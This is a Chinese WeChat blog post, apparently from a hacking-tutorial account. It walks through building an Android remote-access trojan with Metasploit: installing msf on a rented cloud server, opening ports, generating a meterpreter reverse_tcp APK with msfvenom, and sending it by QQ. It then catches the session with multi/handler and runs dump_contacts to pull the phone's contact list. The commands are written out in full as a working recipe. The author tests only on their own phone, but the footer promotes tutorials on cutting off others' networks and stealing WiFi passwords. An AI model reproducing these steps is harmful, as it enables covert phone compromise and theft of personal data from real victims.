> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oZ5OMdp28GjWgaxONVIr-w)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fuBhZCW25hNtiawibXa6jdibJO1LiaaYSDECImNTbFbhRx4BTAibjAv1wDBA/640?wx_fmt=png)

扫码领资料

获黑客教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png)

### 前言：

### **上传手机木马并不是关键，关键在于其中所遇到的问题和解决方案。**

一、思路
----

先简单说说思路吧、利用 msf 生成一个安卓木马。

然后传手机，这里只是单纯的测试一下，就直接用 qq 传给自己的手机吧。

那么在这里就会遇到一个关键问题。

  
手机访问不了你的 msf 电脑。

#### 二、怎么才能让手机访问到你的 msf 主机？

**这里我提供两个方向：**

一：**内网穿透**，就是将你的内网 ip 映射到一个公网 ip 上去。这个服务还是很好找的。大家只要到网上找找就能找到相关服务和软件。

这一种的好处是只要内网穿透开起来了，直接用你虚拟机中的 kali 就可以连上你的手机。

二：好了下面说说第二种，也就是我使用的这种、**直接搞一台云服务器**。

云服务器肯定是有公网 ip 的。所以就不需要内网穿透了。

但是这里有一个不好的地方就是云服务器中肯定是不会存在 msf 的。  

所以这里出现了本文第一个知识点。

### 三、在云服务上安装 msf

连接到云服务器。

**第一步，一串命令，更新源**

yum -y update

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvML0IhaBjNzO96aANNCgHuL25PvEypAjNiaD3aSLcyXAAprDluBvXGu0A/640?wx_fmt=png)

**第二步，三串命令，安装 msf**  

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb

 > msfinstall  

chmod 755 msfinstall

./msfinstall

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMXdwvJsjCQMxp8ibABlUqGZboYOwGlTErfs1L6v9gC9DHJooQDFDicsYQ/640?wx_fmt=png)  

**第三步，三串命令，单独创建一个 msf 用户来进行数据库配置**

cd /opt/metasploit-framework/bin/

useradd msf

passwd msf

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMjBiaiaRMGIE2StJhC8A72ccEHcW9rmj1mQiarQK3s7AJDpE78YWM90bvA/640?wx_fmt=png)  

**第四步，两串命令，进行 msf 数据库配置。**  

su - msf

./msfdb init

上面一步执行时中途需要输入 msf 用户的账号和密码。  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMQtPrClRZ6wGib5ucMcq7kNOLl7BDkYqrqLJ0GvHdWzXLt9H0XHR0ktA/640?wx_fmt=png)  

**第五步，两串命令。返回 root 用户，拷贝相关文件。**

exit

cp /home/msf/.msf4/database.yml /opt/metasploit-framework/embedded/framework/config/

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMydDnXiaw7LOAG9IeiaVpE5SLQ2FHLsfcoNgzv9WicWOh3XiaKQaqLQU1AA/640?wx_fmt=png)  
最后一步，测试数据库是否连接成功。

我们直接 msfconsole 进入 msf 控制台。

db_status

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMn52jkUW7PuPVwMyGlCrjiaiaPvviaEicxOEzuWUGTibU19Oq5oe5pfhHI6Q/640?wx_fmt=png)  
(参考来源：https://woj.app/5996.html)

四、开通端口号

这里需要注意云服务器公网端口号和内网端口号的关系，这里我们捋一捋。

进入云服务器通过命令看看我们开了什么端口。

firewall-cmd —list-port

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvM39EeM915ov0AibE5LJqDjv8wgqT19Jfmn7nlEQKkJfUbibMicu3JgOibNQ/640?wx_fmt=png)  
但是我们真的就能访问到他的这些端口吗？

我们来测试一下。

**在本机虚拟机中开一台 kali，我们用 nmap 扫一下这个云服务器的 ip**。

nmap -sS -Pn

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMFiaS1BzqibqU75wsHHeZ4RZuPIOOOLYQPJibZJRfejMljbzgTdD9o3j7g/640?wx_fmt=png)  
我们发现问题来了，他们的开放端口明显不一样。  

很明显这里一个是公网开放端口一个是内网开放端口。

这里我们看到内网端口开放了很多。随便改不改，因为 39000 到 40000 都是开的。随便选一个用就行。

但是要注意一点、内网公网都要开相同的（这里 1234 就是我手动加上去的。）

### 五、怎么开放公、内网端口

这里我用的是阿里云服务器。

公网：进入阿里云可以看到网络与安全下的一个安全组。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMKLB1S6HfAd5ELRNTZR4WrImf56N1F2BCpoZg8VyGRicr0XLiaU45yAdA/640?wx_fmt=png)

右边有一个配置规则。  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMaBNXefOMA3qMhibNCAAlbG1w8mtUYsR9uKcCKaGdicymjKQ33nzLTIOw/640?wx_fmt=png)  
点进去后配置的就是公网的端口了。  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMDwxGibicG4fWrZ9lkdHRxphcIWEQnlF30humOZeU8PykITWMTkXvKU1w/640?wx_fmt=png)

内网：内网就更简单了。宝塔面板改的就是内网的，当然你也可以试试直接用命令。

这里就不演示了。（还不知道直命令行不行，没试过。）

  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMEnEwt09hMJ9wfEw0w4XHIVAe2atGQ34lxquUbxpYtib68P9C9bxwgHA/640?wx_fmt=png)

好了，配置完成后我们在用 nmap 扫描一下。

  
这里看到出现 1234 端口了（我在公网上配置的也是 1234 端口。）

虽然上面说状态是 closed，不过无关紧要。

  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMYIvx8QAf1BkJPq8nC4Beoic3eYLlfMibxDqiaPgibxNSWaqk7f4OX3ia5Gw/640?wx_fmt=png)

六、生成 apk 木马

准备工作已经完成，现在开始写马

这里我是直接在自己本机虚拟机中的 kali 里写马，  
（这里直接用云服务器中的 msf 写马，要传到手机上去有一点麻烦，所以我干脆直接在本机写马，将 ip 改成云服务器的就行。）

这里我的云服务器只负责接受会话。

生成 apk 木马。

msfvenom -p android/meterpreter/reverse_tcp lhost = 公网 ip lport=1234 R > qq.apk

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMxxM3zKwGlib6e7vJbia8U2vgibibxpSTQqIfmCjZKNaxaj2Juc0j9ibYzng/640?wx_fmt=png)  
**生成木马后直接拖到本机再通过 qq 传给手机安装即可**。

（注：毕竟只是干 web 渗透的，所以这里对手机上的 apk 木马就不再进行编码加壳签名什么的了，手机检测到木马有危险性是肯定会的，手动允许一下就可以。）

**好了，手机现在安装上木马了，回到云服务器上打开监听模块。**

（要是小伙伴们真的想研究，以后等我有时间再专门研究一下 apk 木马绕过，再发文讨论吧。）

### 七、msf 中 handler 选项配置

进入云服务器。打开 msf 控制台。

**使用 handler 监听木马。**

use exploit/multi/handler

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMfRwawV8VEm1SBHQTuBqy25OH9T3OZVGgyS4rrVUSoTd822NTicE5snQ/640?wx_fmt=png)  
查看参数配置。

options

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMSEP4OyOW5KDoNmu68uicGaf27dhfzSNQSLWEY9fNOIRUvBqmpLV0mbQ/640?wx_fmt=png)  
这里只需要设置三个参数。payload,lhost,lport。  
三串命令。

set payload android/meterpreter/reverse_tcp

set lhost xxx.xxx.xxx.xxx

这里 lhost 就是这里云服务器的公网 ip。

set lport 1234

options

设置完之后再查看一下配置，看看是否设置成功。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMOcDXps9ncj9O9T677V4o4Eosl5pHsribmibYg1SwiclRlCV53ZgznrJ5A/640?wx_fmt=png)  
可以看到已经成功了。

#### 八、两对 lhost,lport

这里详细解释一下这两对 ip 的端口。在生成木马时的 ip 和端口设置比较简单，就是云服务器的公网 ip 和公网端口。这里没什么好说的。

重点要说一下监听模块设置的 ip 和端口，端口还是一样的，公网内网都要是同一个端口号，意思就是木马里写的是公网里的一个端口（前提是开放的端口），内网就要开启相应的端口进行监听。这里也很好理解。最后就只剩下监听 ip。

**这里我们到底要设置公网还是内网的呢？**

诶，你会发现不管设置公网还是内网都可以监听到木马。

  
为什么呢？我们来看看这里。

  
这里是开公网端口时的设置。

  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMTAL9Z3xwLCnhibbiaUlGPZmsiaukmO02X1Mx3NwySFU7FicZCKkCK8fOew/640?wx_fmt=png)  
相信大家都已经懂了。

**执行木马后，木马通过公网 ip 找到公网 ip 服务器，应该说是路由器。**

然后这个路由器通过你设置的规则使用广播地址，也就是 0.0.0.0。

**对这个内网里的所以 ip 主机进行通信**。  

所以这里监听公网内网都可以，但是注意这里只是大部分，还是有少量的反弹木马，在监听时 ip 写内网是得不到会话的。（我不会承认我只是单纯的忘了。）

总结一点就是 ip 全部用公网的，端口设相同的（前提是开放的端口）。

### 九、建立会话：

运行 handler 模块。

run

开始监听后点击一下手机上的木马。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMs7pAU2VwPW7Lca9MKksPxia5L0LVhl9PtF6p1yVyNeFclcsASDJRF9Q/640?wx_fmt=png)  
‍‍‍‍这里看到第一行报了一个错。

所以这就是都用公网的不好，也不能说是不好吧，它会说找不到公网的这个端口。

但是在这里设置了规则，公网会直接转到这台内网电脑上，所以效果都一样。

### 十、利用：

这里简单看看支持什么命令。  
？  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMwzibgAb6fmLibJFrLwLseIR9oFXGiafibwqHMXq51UWhM69ATt2KaovUkg/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMxSlmsViazHXAbcTEq6RRMPVrEL56XHrA7tcMcJsXIxnqTP8GUsjicD1g/640?wx_fmt=png)  
看到有很多好玩的命令。

我们试试前一段时间很火的一个命令。

大家猜猜这命令的用处。

dump_contacts

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMwgGhUoX6ATmXeLs03RRr4GB37or5ZJbgmFrvQVe1iavnTuoDqP54rAw/640?wx_fmt=png)  
  

可以看到他生成了一个文件。我们找到看看。  
ls /root

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMcQIa8icnvORlCYRA1Z5I4A5bKt8Cf5nCCPmnySEIUbKEjUTgLFIOddw/640?wx_fmt=png)

cat /root/contacts_dump_20210417190439.txt

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSESXbInbSAibMicdvBJgNJZvM1qaCrUp3hz0Wgod5BY7hrjQ4uvr60YZRLGRBIvBrGySWOkhVib2Xjsw/640?wx_fmt=png)  
相信大家已经猜到了，  
dump_contacts  
获取联系人列表。

### 最后总结：

过程都讲给你们，总结咱就过吧！又是美好的一天

  
![](https://mmbiz.qpic.cn/mmbiz_gif/CBJYPapLzSESXbInbSAibMicdvBJgNJZvMVbSrDfaV7MCozGveyJwEhl6cn3FFkLho0EaIp3AcSChjLpibPcAw6uA/640?wx_fmt=gif)

学习更多黑客技能！体验靶场实战练习

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFl47EYg6ls051qhdSjLlw0BxJG577ibQVuFIDnM6s3IfO3icwAh4aA9y93tNZ3yPick93sjUs9n7kjg/640?wx_fmt=png)

（黑客视频资料及工具）  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CBJYPapLzSEDYDXMUyXOORnntKZKuIu5iaaqlBxRrM5G7GsnS5fY4V7PwsMWuGTaMIlgXxyYzTDWTxIUwndF8vw/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_png/sSriaaVicBMGmevib5nPyT8m3VxloX9cCQVGymXpYDibVwwMOmSaPtE9ib02ic3rRqoJH3Tics60h67X4ASIkXDowHV5A/640?wx_fmt=png)

往期回顾

[

一次网站测试引发的注入 “血案”

2021-02-08

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHj9iasH2dcJFibtB5DCTicyiaiajUDfMK2JbM1DI8KIV2xfS1VAiagt4vtoRXkrH6xw2cJHsGWKOWPPOPA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247508950&idx=1&sn=1cc23676a3246bd2fcce34f5154dea33&chksm=ebeaeafbdc9d63ed32f6a76558eb1fff0e0c8e8568d497ebb02595654afcab62ccdfe08e69ee&scene=21#wechat_redirect)

[

Fofa+Xray 联合实现批量挖洞

2021-02-01

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFvCmthyMgtPZH5h5GzzhoGoMY2eVhVq0iaAJjac8v8aiad2OdL5kEhrrlfxHuDXObicNQWArFbJMkgA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247507465&idx=1&sn=33bbfae575988803225594e26f5391e8&chksm=ebea9724dc9d1e3263f7403fbb34e14424311d0e9145b7d48d0815fef5ce54f6c81a164a0cce&scene=21#wechat_redirect)

[

【教程】局域网内截断别人的网络

2021-01-25

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFo77xhO7nbHF1sC4ttpjWTsW1YEDpjjOw6TLXic8ewT6UlX8etiahc7eibaxBJsVR3nMnmkG7aPmBVg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247506774&idx=1&sn=aec7a3668dfe733bf9b59de04031f115&chksm=ebea927bdc9d1b6d371807bd838a4bda48bbb6094564fe8d5db9d5c4a5b85a98c596f8cb7b84&scene=21#wechat_redirect)

[

牛掰了，用最朴素的方法 WiFi 无线渗透，偷密码

2020-11-09

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSF9ybAjBj5oR492egQ2WqPkJUydEdGLZX1ws5UkzhiaqicOAHIyWwAtFGvG0SFsz6ThrU3jlF8BgGyg/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247498199&idx=1&sn=eeacfefbb945d4a753a916c080ec124f&chksm=ebeab0fadc9d39ecc69ccd226080765985ade5c23c6167a6508f2eba009d546daee64737b43f&scene=21#wechat_redirect)

[

熬夜挖 edu.SRC！看我挖到了个啥

2020-10-31

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEsmnHzkINru1voVgUCQNS0bEDOejmRicHD5pchouUZyTPWM17B6iciakomouteVUYgiajx85NJ9TomPw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247497527&idx=1&sn=8bcde2f43eb9c30dfb29124cb111befa&chksm=ebeabe1adc9d370cb7bb28c2bd0de90262bce91f7b054be7c93fe98165a1245bb749c1cf71aa&scene=21#wechat_redirect)

[16 个练习黑客技术的在线网站](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247492231&idx=1&sn=ad0aba8cd0a9d3620973e3dbc10ed604&chksm=ebeaabaadc9d22bcea2e445b7c6bf28db73ad529cefeeb8a70e9f22868e1bfbd29f1774512ae&scene=21#wechat_redirect)

[2020-08-22](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247492231&idx=1&sn=ad0aba8cd0a9d3620973e3dbc10ed604&chksm=ebeaabaadc9d22bcea2e445b7c6bf28db73ad529cefeeb8a70e9f22868e1bfbd29f1774512ae&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGFX06lQLY3jibA59V5OdTbgU97UNEtRz2TEZlKlFsg9yGkib4BELJ5ialMpxK9Iq1D13f6lyzibtNfDQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247492231&idx=1&sn=ad0aba8cd0a9d3620973e3dbc10ed604&chksm=ebeaabaadc9d22bcea2e445b7c6bf28db73ad529cefeeb8a70e9f22868e1bfbd29f1774512ae&scene=21#wechat_redirect)